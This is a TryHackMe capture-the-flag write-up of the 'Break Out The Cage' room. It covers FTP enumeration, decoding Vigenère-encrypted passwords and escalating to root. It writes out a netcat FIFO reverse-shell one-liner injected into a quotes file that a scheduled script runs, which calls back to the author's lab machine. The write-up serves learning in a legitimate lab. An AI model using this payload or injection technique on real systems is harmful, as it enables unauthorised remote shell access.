**<p align="center">TryHackMe: Break Out The Cage</p>**
---

<p align="center">
<img
src="https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Break-Out-The-Cage/Images/room%20icon.jpeg" alt="image alt" width="180" />
</p>

[![Day 29 of 30 – Hack Documentation Challenge](https://img.shields.io/badge/Day%2029%20of%2030-Hack%20Documentation%20Challenge-crimson?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)

**Topic:** Web application pentesting

**Completed:** 8/13/2025

“Help Cage bring back his acting career and investigate the nefarious goings on of his agent!”

<p align="center">+++++++++</p>

Beginning with an `nmap -sV -sC` scan, I identified three open TCP ports:
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Nicholas Cage Stories
```

Two things stood out immediately:
- Anonymous FTP login was enabled.

- Port 80 hosted a site called “Nicholas Cage Stories.”

Checking out the HTTP service brought me to a static web page where Mr. Cage appeared to share updates with his fans. The page didn’t have working navigation links, but its source code included a few images and hardcoded references that felt worth keeping in mind for later.

![Alt text](1)

Since anonymous login was allowed, I connected to the FTP server and found a single file named `dad_tasks`. I downloaded it using:
```
get dad_tasks
```

![Alt text](2)

Opening the file showed Base64-encoded text. After decoding, the result still looked scrambled, indicating it was likely encrypted or encoded again.

![Alt text](3)

To further investigate the scrambled output from the `dad_tasks` file, I ran it through an online cipher identifier. The tool recognized the text as a Vigenère cipher, which I was able to decode successfully. The plaintext not only contained some funny “Dad’s Tasks,” but also revealed Weston’s password.

![Alt text](4)

Using the recovered credentials, I logged into Weston’s account via SSH:
```
ssh weston@10.201.18.31
```

![Alt text](5)

I began basic enumeration to identify other local users and check for potential privilege escalation paths.

To list accounts with home directories:
```
cat /etc/passwd | grep "/home"
```

To see what commands Weston could run as root:
```
sudo -l
```

The output revealed Weston could run `/usr/bin/bees` as root. Executing it displayed the following broadcast message:
```
"AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
```

![Alt text](6)

I checked group memberships using:
```
id
```

This confirmed Weston was also part of the `cage` group.

To search for files owned by this group, I ran:
```
find / -group cage 2>/dev/null
```

Among the results, one file stood out:
`/opt/.dads_scripts/spread_the_quotes.py`, a Python script responsible for the periodic broadcast quotes.

![Alt text](7)

Opening `/opt/.dads_scripts/spread_the_quotes.py` revealed a short Python script that reads all lines from `/opt/.dads_scripts/.files/.quotes`, randomly selects one, and then uses the `wall` command to broadcast it to all logged-in users.


This means that anything placed into `.quotes` would be executed by `wall`, giving us a potential code execution vector.

![Alt text](8)

Knowing I could inject commands, I looked up a Pentestmonkey Netcat reverse shell payload and set up a listener on my attack machine on port `4563`:
```
nc -lvnp 4563
```

![Alt text](9)

Opening `/opt/.dads_scripts/.files/.quotes` showed a long list of quotes, matching the ones broadcasted every few minutes by the script.

![Alt text](10)

To hijack the broadcast process, I overwrote the `.quotes` file with my payload:
```
echo "hello;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.201.18.126 4563 >/tmp/f" > /opt/.dads_scripts/.files/.quotes
```

`hello;` being a harmless filler to ensure the rest of the command runs cleanly. The rest creates a FIFO, connects back to my listener, and attaches an interactive shell.

After a moment, the scheduled script executed and I caught a reverse shell, now running as the user `cage`.

![Alt text](11)

To make the reverse shell more usable, I upgraded it to a fully interactive TTY:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

On the user home directory lay a `email_backup` folder & a `Super_Duper_Checklist` file. The `Super_Duper_Checklist file` included the first THM flag.

![Alt text](12)

Reading through the emails in `email_backup` revealed clues for escalating privileges, confirming that Cage was not running as root.

![Alt text](13)

One email in particular, `email_3`, contained a string that looked like a ciphered password and repeated the word  `face` way too many times.

![Alt text](14)

Using an online cipher identifier, I determined the string was encrypted with a Vigenère cipher. The key was `face`, and decoding it revealed the root user’s password.

![Alt text](15)

Using the `su -` to change to the root user, along with the discovered password, successfully gave full root privileges.

In the root directory, there was another `email_backup` folder containing several more emails.

![Alt text](16)

Reading through the emails we find that Cage was in fact not being paranoid about his agent, he was in fact praying for his downfall. Amongst the theatrics was the root flag!

![Alt text](17)

<p align="center">+</p>

**Lessons Learned**

This room was really intriguing and a lot of fun to work through. It taught me about Vigenère ciphers and also introduced me to the `wall` command, what it is, how it works, and how it can be leveraged for command execution. Another room that highlighed the importance of careful enumeration, analyzing encoded data, and thinking creatively for privilege escalation, showing how multiple techniques can be combined to move from a low-privilege user to root.

<p align="center">+++++++++</p>

🔒 Out of respect for the learning experience, I’ve chosen not to share the flag answers directly. Instead, I’ve documented my full process to support both others and myself in understanding the vulnerability.

**Resources**:
- [TryHackMe's Break Out The Cage Room](https://tryhackme.com/room/breakoutthecage1)
- [Cipher Identifier](https://www.dcode.fr/cipher-identifier)
